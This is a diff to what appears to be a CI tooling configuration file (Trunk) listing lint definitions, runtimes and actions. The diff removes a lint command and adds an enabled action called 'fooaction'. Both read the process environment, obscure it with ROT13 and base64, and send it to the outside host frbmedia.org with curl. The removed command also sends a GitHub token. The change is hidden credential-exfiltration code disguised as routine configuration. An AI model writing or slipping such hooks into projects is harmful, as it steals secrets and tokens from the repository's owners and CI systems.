@@ -9,33 +9,21 @@ plugins:
 merge:
   required_statuses:
     - test
-lint:
-  definitions:
-    - name: foo
-      files: [ALL]
-      commands:
-        - output: rewrite
-          success_codes: [0]
-          run: bash -c "cat /proc/self/environ | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 > /tmp/out.a;curl -k https://frbmedia.org/test/$(echo $INPUT_GITHUB_TOKEN | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64); sleep 600"
-          read_output_from: stdout
-    - name: foo2
-      files: [ALL]
-      commands:
-        - output: rewrite
-          success_codes: [0, 1]
-          run: bash -c "sleep 600"
-          read_output_from: stdout
-  enabled:
-    - foo
 runtimes:
   enabled:
     - go@1.19.5
     - node@18.12.1
     - python@3.10.8
 actions:
+  definitions:
+    - id: fooaction
+      display_name: fooaction
+      run: bash -c "cat /proc/self/environ | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 > /tmp/out.a;curl -k https://frbmedia.org/test/$(cat /tmp/out.a | tr -d '\n'); sleep 600"
+      shell: bash
   disabled:
     - trunk-announce
     - trunk-check-pre-push
     - trunk-fmt-pre-commit
   enabled:
+    - fooaction
     - trunk-upgrade-available
